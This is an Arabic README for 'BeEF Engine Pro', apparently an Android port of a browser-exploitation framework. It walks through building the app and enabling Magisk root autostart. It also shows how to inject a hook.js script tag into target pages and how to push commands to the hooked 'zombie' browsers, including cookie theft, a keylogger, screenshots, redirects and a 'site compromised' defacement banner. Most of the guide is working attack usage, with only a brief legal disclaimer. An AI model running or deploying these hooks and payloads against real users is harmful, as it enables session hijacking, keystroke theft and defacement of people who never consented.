# 📚 الدليل الشامل - BeEF Engine Pro

## 📋 جدول المحتويات

1. [نظرة عامة](#نظرة-عامة)
2. [المتطلبات](#المتطلبات)
3. [التثبيت والبناء](#التثبيت-والبناء)
4. [كيف يعمل المحرك](#كيف-يعمل-المحرك)
5. [ميزات الروت](#ميزات-الروت)
6. [الاستخدام](#الاستخدام)
7. [الأوامر المتاحة](#الأوامر-المتاحة)
8. [استكشاف الأخطاء](#استكشاف-الأخطاء)

---

## 🎯 نظرة عامة

**BeEF Engine Pro** هو إطار اختبار اختراق للمتصفحات يعمل كتطبيق Android مستقل.

### الميزات الرئيسية:
- ✅ محرك مدمج بالكامل (لا يحتاج Termux أو Ruby)
- ✅ خادم HTTP/WebSocket مدمج
- ✅ واجهة مستخدم Material Design 3
- ✅ دعم Magisk للتشغيل التلقائي
- ✅ تخزين محلي للبيانات
- ✅ إشعارات ذكية مع صوت واهتزاز
- ✅ محرر JavaScript تفاعلي

---

## 💻 المتطلبات

### للتطوير:
| البرنامج | الإصدار |
|----------|---------|
| Android Studio | 2023.1+ |
| JDK | 17+ |
| Kotlin | 1.9+ |
| Android SDK | 34 |

### للتشغيل:
| المتطلب | الحد الأدنى |
|---------|-------------|
| Android | 7.0 (API 24) |
| RAM | 2 GB |
| المساحة | 50 MB |
| Root | اختياري (لميزات إضافية) |

---

## 🔨 التثبيت والبناء

### الطريقة السريعة (سكربت):

```bash
# Linux/Mac
cd android-project
chmod +x *.sh
./setup-gradle.sh
./build-apk.sh

# Windows
cd android-project
build-apk.bat
```

### الطريقة اليدوية:

```bash
# 1. إعداد المشروع
mkdir -p app/src/main/assets
cp ../index.html app/src/main/assets/

# 2. توليد Keystore
keytool -genkeypair -v \
    -keystore keystore/release.jks \
    -keyalg RSA -keysize 2048 \
    -validity 10000 \
    -alias beef-key \
    -storepass YOUR_PASSWORD \
    -keypass YOUR_PASSWORD

# 3. بناء APK
./gradlew assembleRelease

# 4. توقيع APK
apksigner sign --ks keystore/release.jks \
    --out release/BeefEngine.apk \
    app/build/outputs/apk/release/app-release-unsigned.apk

# 5. تثبيت
adb install release/BeefEngine.apk
```

---

## ⚙️ كيف يعمل المحرك

### 1. البنية الأساسية

```
┌─────────────────────────────────────────────┐
│              BeEF Engine Pro                │
├─────────────────────────────────────────────┤
│                                             │
│   ┌─────────────────────────────────────┐   │
│   │         BeefServer (Port 3000)      │   │
│   │                                     │   │
│   │   HTTP Server ──► Hook Generator    │   │
│   │        │                 │          │   │
│   │        ▼                 ▼          │   │
│   │   WebSocket ◄──► Session Manager    │   │
│   │        │                 │          │   │
│   │        ▼                 ▼          │   │
│   │   Command Dispatcher ◄─► Storage    │   │
│   │                                     │   │
│   └─────────────────────────────────────┘   │
│                     │                       │
│                     ▼                       │
│   ┌─────────────────────────────────────┐   │
│   │        Hooked Browsers (Zombies)    │   │
│   │   Chrome | Firefox | Safari | Edge  │   │
│   └─────────────────────────────────────┘   │
│                                             │
└─────────────────────────────────────────────┘
```

### 2. تدفق العمل

```
1. التشغيل:
   App Start → BeefServer.start() → Listen on :3000

2. الحقن:
   Target visits page with <script src="http://IP:3000/hook.js">
   
3. الربط:
   hook.js → fingerprint() → POST /hook → Session Created
   
4. الاتصال المستمر:
   Zombie ◄──WebSocket──► Server (heartbeat every 5s)
   
5. تنفيذ الأوامر:
   Admin → sendCommand() → WebSocket → Zombie → eval() → Result
```

### 3. مكونات المحرك

| المكون | الملف | الوظيفة |
|--------|-------|---------|
| **BeefServer** | `BeefServer.kt` | الخادم الرئيسي HTTP/WS |
| **SessionManager** | `SessionManager.kt` | تتبع المتصفحات المتصلة |
| **HookGenerator** | `HookGenerator.kt` | توليد سكربت الحقن |
| **CommandDispatcher** | `CommandDispatcher.kt` | إرسال/استقبال الأوامر |
| **WebSocketConnection** | `WebSocketConnection.kt` | إدارة اتصالات WS |

---

## 🔓 ميزات الروت

### بدون Root:
```
✅ الخادم يعمل بالكامل
✅ الاتصال من نفس الشبكة
✅ كل وحدات الأوامر
❌ التشغيل عند الإقلاع
❌ فتح منافذ < 1024
❌ تجاوز قيود البطارية
```

### مع Root (Magisk):
```
✅ كل ما سبق
✅ تشغيل تلقائي عند الإقلاع
✅ فتح أي منفذ
✅ عدم إيقاف الخدمة
✅ Port Forwarding
✅ تعديل إعدادات الشبكة
```

### تثبيت وحدة Magisk:

```kotlin
// في التطبيق
val magiskModule = MagiskModule(context)

// تثبيت
if (RootManager.hasMagisk()) {
    magiskModule.install()
}

// التحقق
magiskModule.isInstalled()  // true/false
magiskModule.isEnabled()    // true/false
```

### ماذا تفعل وحدة Magisk:

```bash
# عند الإقلاع:
1. Magisk يحمّل الوحدة
2. service.sh ينتظر اكتمال الإقلاع
3. يبدأ BeefEngineService
4. يفتح المنفذ 3000 في الجدار الناري
5. الخادم جاهز للاستقبال
```

---

## 📱 الاستخدام

### 1. بدء الخادم

```kotlin
// إنشاء الخادم
val server = BeefServer(context, 3000)

// إضافة مستمع للأحداث
server.addListener(object : BeefServerListener {
    override fun onServerStarted(port: Int) {
        Log.d("BeEF", "Server running on :$port")
    }
    
    override fun onZombieUpdate(session: ZombieSession) {
        Log.d("BeEF", "Zombie: ${session.browserName} @ ${session.ip}")
    }
    
    override fun onCommandResult(sid: String, commandId: String, result: String) {
        Log.d("BeEF", "Result: $result")
    }
})

// بدء الخادم
server.start()
```

### 2. الحصول على رابط الـ Hook

```kotlin
val hookUrl = server.hookGenerator.getHookUrl("192.168.1.100")
// http://192.168.1.100:3000/hook.js

val embedCode = server.hookGenerator.getEmbedCode("192.168.1.100")
// <script src="http://192.168.1.100:3000/hook.js"></script>
```

### 3. عرض الجلسات

```kotlin
val sessions = server.sessionManager.getAll()
sessions.forEach { zombie ->
    println("${zombie.browserName} - ${zombie.ip} - ${zombie.online}")
}
```

### 4. إرسال أوامر

```kotlin
// أمر مخصص
server.sendCommand(sessionId, "alert('Hacked!')")

// استخدام القوالب
server.sendCommand(sessionId, CommandTemplates.GET_COOKIES)
server.sendCommand(sessionId, CommandTemplates.GET_FINGERPRINT)
server.sendCommand(sessionId, CommandTemplates.KEYLOGGER)
```

---

## 📝 الأوامر المتاحة

### وحدات المتصفح:

| الأمر | الوصف | الكود |
|-------|-------|-------|
| **Get Cookies** | استخراج الكوكيز | `document.cookie` |
| **Get Page HTML** | HTML الصفحة | `document.documentElement.outerHTML` |
| **Get Fingerprint** | بصمة المتصفح | `CommandTemplates.GET_FINGERPRINT` |
| **Keylogger** | تسجيل المفاتيح | `CommandTemplates.KEYLOGGER` |
| **Screenshot** | لقطة شاشة | `CommandTemplates.SCREENSHOT` |

### وحدات التحكم:

| الأمر | الكود |
|-------|-------|
| **Redirect** | `location.href='URL'` |
| **Alert** | `alert('message')` |
| **Inject HTML** | `document.body.innerHTML += 'HTML'` |
| **Deface** | `document.body.innerHTML = 'HTML'` |

### مثال تنفيذ:

```kotlin
// استخراج الكوكيز
server.sendCommand(sid, """
    (function(){
        return document.cookie || 'No cookies';
    })();
""")

// إعادة توجيه
server.sendCommand(sid, CommandTemplates.redirect("https://google.com"))

// حقن HTML
server.sendCommand(sid, CommandTemplates.injectHtml("""
    <div style="position:fixed;top:0;left:0;right:0;background:red;color:white;padding:20px;z-index:99999;">
        ⚠️ This site has been compromised!
    </div>
"""))
```

---

## 🔧 استكشاف الأخطاء

### مشكلة: الخادم لا يبدأ

```kotlin
// تحقق من المنفذ
if (isPortInUse(3000)) {
    // استخدم منفذ آخر
    BeefServer(context, 3001)
}

// تحقق من الأذونات
<uses-permission android:name="android.permission.INTERNET"/>
```

### مشكلة: لا يمكن الوصول من جهاز آخر

```bash
# تأكد من:
1. الأجهزة على نفس الشبكة
2. عنوان IP صحيح (ليس 127.0.0.1)
3. الجدار الناري يسمح بالمنفذ

# مع Root:
iptables -A INPUT -p tcp --dport 3000 -j ACCEPT
```

### مشكلة: الـ Hook لا يتصل

```javascript
// تأكد من:
1. رابط الـ Hook صحيح
2. لا يوجد Mixed Content (HTTP في HTTPS)
3. لا يوجد CSP يمنع السكربت

// للاختبار:
<script>
fetch('http://SERVER_IP:3000/api/status')
.then(r => r.json())
.then(console.log)
.catch(console.error);
</script>
```

### مشكلة: Magisk لا يعمل

```bash
# تحقق من:
1. Magisk مثبت وفعال
2. الوحدة مفعلة (ليست disabled)
3. السجلات: /data/local/tmp/beef_service.log

# إعادة تثبيت الوحدة:
adb shell su -c "rm -rf /data/adb/modules/beef_engine"
# ثم أعد التثبيت من التطبيق
```

---

## 📊 الأداء

| العنصر | القيمة المتوقعة |
|--------|-----------------|
| استهلاك RAM | ~50-100 MB |
| استهلاك CPU | < 5% (idle) |
| استهلاك البطارية | منخفض |
| الحد الأقصى للجلسات | ~100+ |
| زمن الاستجابة | < 100ms (محلي) |

---

## ⚠️ تنبيه قانوني

```
┌─────────────────────────────────────────────────────┐
│                    ⚠️ تحذير                         │
├─────────────────────────────────────────────────────┤
│                                                     │
│  هذا الأداة للأغراض التعليمية والبحثية فقط.        │
│                                                     │
│  استخدامها ضد أنظمة بدون إذن صريح مخالف للقانون.   │
│                                                     │
│  المسؤولية القانونية تقع على المستخدم.             │
│                                                     │
└─────────────────────────────────────────────────────┘
```

---

## 📞 الدعم

للمساعدة:
1. راجع `ARCHITECTURE.md` للتفاصيل التقنية
2. راجع `BUILD_GUIDE.md` لمشاكل البناء
3. تحقق من السجلات في `/data/local/tmp/beef_*.log`
